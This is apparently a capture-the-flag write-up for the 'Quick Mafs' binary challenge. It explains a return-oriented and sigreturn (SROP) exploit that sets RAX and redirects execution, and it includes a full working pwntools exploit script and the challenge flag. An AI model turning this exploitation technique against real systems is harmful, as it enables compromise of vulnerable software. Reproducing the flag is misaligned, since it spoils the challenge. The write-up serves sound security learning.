# Quick Mafs

## Challenge

When we connect to the server, we are given instructions to call `print` with a specific RAX value.

We are also given a binary to exploit, encoded as a hexadecimal string.

Each binary has PIE disabled and no canary, allowing us to use return oriented programing with gadgets present in the binary.

There are also 160 provided gadgets, which all perform an arithmetic operation on RAX with some constant value.
The operations include addition, subtraction, and xor.
THe constants are random 16 bit values.
The operations and constants for each gadget is randomized between runs.

We are allowed to send a single input as a hexadecimal encoded string to the server, which will be passed to the binary.

If we successfully solve 5 challenges consecutively, we are given the flag.

## Solution

The proper solution would be to parse the 160 provided gadgets and use a symbolic solver such as [Z3](https://github.com/Z3Prover/z3).

But I came here to do pwn, not math, so that's what we're going to do.

We can use the return value of the read system call to set RAX to set up other system calls.
This isn't enough to set RAX to meet the challenge instructions, as we are limited to RAX <= 0x2000 while the target could be as high as 0xffff.

One syscall that comes to mind is sigreturn, which allows us to set every register.
We can use this to set RAX to the target value, RSP to an arbitrary writable address, and RIP to the `print` function.
However, we need approximately 0x100 characters to set up the sigreturn frame to specify these registers, while RAX needs to be 15 to call this sycall.
This problem is solved by setting up the sigreturn frame in the first syscall, but using a second read before reaching it to set RAX to 15.

This solution brings a new challenge based on the design of the challenge.
We are limited to a single message at the start of the challenge, we cannot simply wait for the first read to finish before sending the second input.
This is solved by padding our first read to the full 0x2000 bytes so that any excess bytes will have to be read by the second read syscall.

This works locally, but usually fails on the remote.
After talking to the CTF organizers, the challenge has buffering-related issues with large inputs.
This resulted in the sigreturn method described above only working about once every 5 or 10 runs. 
We needed 5 successes in a row, so this was quite an issue.
I added a small optimization where, if the target was less than 0x2000, I used the first read syscall to set RAX without the sigreturn.
Combining these methods, I tried running the program many times, as I would occasionally get 2 or 3 successes in a row still.
On around 3 runs, I even got 4 successes in a row, but never the 5 I needed, and I realized that I had to revise my strategy.

Still wanting to avoid doing actual math or solving, I realised I could use a single subtraction gadget to get my RAX to 15 after the first read.
To do so, I parsed all the provided gadgets and searched for one which would subtract a value from RAX that was greater than my payload,
but low enough that I could avoid buffering problems.
Then I would pad my payload to be 15 bytes greater than the subtract gadget value, so after the subtraction RAX would be 15.
This allowed me to more reliably execute the sigreturn and set RAX.
While this approach still failed occasionally, as sometimes no gadget existed within these specifications,
it was reliable enough to get a flag within a few runs.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *
import r2pipe

p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")

for binary in range(5):
    instructions = p.recvline() # the server will give you instructions as to what your exploit should do
    p.info("INSTRUCTIONS: " + instructions.decode())
    instructions = instructions.split()
    targetrax = int(instructions[-1], 0)

    with open("elf", "wb") as file:
        file.write(bytes.fromhex(p.recvline().rstrip().decode()))

    exe = context.binary = ELF('elf')

    r = r2pipe.open(exe.path)
    r.cmd('aaa')
    syscall = r.cmdj('pdfj @ sym.vuln')['ops'][-4]['offset']

    gadgets = r.cmdj('pdj 480 @ sym.gadgets + 0xc')
    gadgets = [gadgets[i:i+3] for i in range(0, len(gadgets), 3)]

    # print(gadgets)

    constants_raw = r.cmdj('p8j 320 @ obj.constants')
    constants = [constants_raw[i] + constants_raw[i+1] * 0x100 for i in range(0, len(constants_raw), 2)]

    # print(constants)

    for i in range(len(gadgets)):
        if gadgets[i][1]['opcode'] == "sub ax, word [rbx]" and constants[i] < 0xe00 and constants[i] >= 0x110:
            constant = constants[i]
            gadget = gadgets[i]
            break

    length = constant + 15

    # print(gadget)

    p.info("CONSTANT: " + hex(constant))
    p.info("LENGTH: " + hex(length))

    frame = SigreturnFrame()
    frame.rax = targetrax
    frame.rip = exe.sym['print']
    frame.rsp = exe.address + 0x4600

    payload = flat({
        0x8: [
            gadget[0]['offset'],
            syscall,
            frame,
            ],
        }, length=length)

    p.sendline(payload.hex().encode())

p.interactive()
```

## Flag

```
gigem{7w0_qu4dr1ll10n?_7h475_r34lly_qu1ck_m47h}
```
